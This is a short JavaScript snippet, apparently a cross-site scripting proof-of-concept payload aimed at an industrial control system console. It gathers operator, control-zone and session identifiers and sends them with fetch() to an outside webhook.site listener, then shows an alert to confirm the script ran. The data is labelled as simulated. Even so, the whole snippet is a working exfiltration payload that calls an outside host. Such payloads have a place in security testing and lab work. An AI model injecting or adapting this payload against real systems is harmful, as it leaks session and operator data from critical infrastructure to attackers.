// Simulated beacon leak from ICS Console
const beacon = {
  operator: "readonly_user_14",
  control_zone: "WTR-GATE-03-A",
  node_status: "pending",
  session_id: "O-TX-11-403"
};

// Send data to your webhook listener
fetch("https://webhook.site/9edb9b46-dd76-4b84-a93e-5aa8f0efbd1b?" + new URLSearchParams(beacon));

// Optional: show a message to prove JS runs
alert("⚠️ ICS Console Beacon Leaked!");
